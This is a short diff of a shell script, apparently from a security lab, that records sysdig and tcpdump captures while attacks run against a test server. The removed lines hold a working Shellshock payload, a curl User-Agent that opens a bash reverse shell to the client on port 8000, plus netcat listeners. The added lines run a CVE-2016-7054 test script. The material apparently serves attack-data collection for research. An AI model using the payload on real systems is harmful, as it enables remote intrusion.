@@ -8,25 +8,16 @@ ssh -i ./server.pem softseclab@$theserver  sudo sysdig_cap -w stream-$i.scap -z 
 
 
 ssh -i ./server.pem softseclab@$theserver sudo nohup tcpdump_cap -i eth0 -s0 -w stream-$i.cap port not 22 and port not 3490 and port not 3492 and port not 3790 and port not 80 >pdump.out &
-sleep 5
-tail -f fifo1 | nc -l 8000 &
-nc -l 9000  > outfile &
 
+sleep 2 
+python test-cve-2016-7054.py $theserver 8000
 
-curl -k -A "() { :; };/bin/bash -i >& /dev/tcp/$theclient/8000 0>&1" --data @data.txt https://$theserver/cgi-bin/ss & 
-cat test3 > fifo1
-sleep 15 
+sleep 2
 
-
-ssh -i ./server.pem softseclab@$theserver sudo killall -s SIGINT sysdig_cap
+ssh -i ./server.pem softseclab@$theserver sudo killall -s SIGINT sysdig_cap 
 ssh -i ./server.pem softseclab@$theserver sudo killall -s SIGINT tcpdump_cap
-sudo killall -s SIGINT nc
-sudo killall -9 tail
 
 
 
-
-
-sleep 4
+sleep 2
 done
-
